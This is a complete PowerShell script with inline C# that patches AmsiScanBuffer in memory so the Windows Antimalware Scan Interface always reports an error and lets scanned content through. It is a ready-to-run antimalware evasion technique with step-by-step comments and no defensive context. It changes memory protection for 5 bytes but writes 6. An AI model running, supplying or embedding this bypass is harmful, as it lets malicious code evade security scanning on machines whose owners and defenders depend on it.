$code = @"
using System;
using System.Runtime.InteropServices;

public class Amsi {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $code

# 1. Find the address of AmsiScanBuffer
$handle = [Amsi]::GetModuleHandle("amsi.dll")
$address = [Amsi]::GetProcAddress($handle, "AmsiScanBuffer")

# 2. Change memory protection to 'Writeable' (0x40)
$p = 0
[Amsi]::VirtualProtect($address, [uint32]5, 0x40, [ref]$p)

# 3. Patch with 'mov eax, 0x80070057; ret' (The "Error" result)
# This makes AMSI think it encountered an internal error and 'fail open'
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $address, 6)
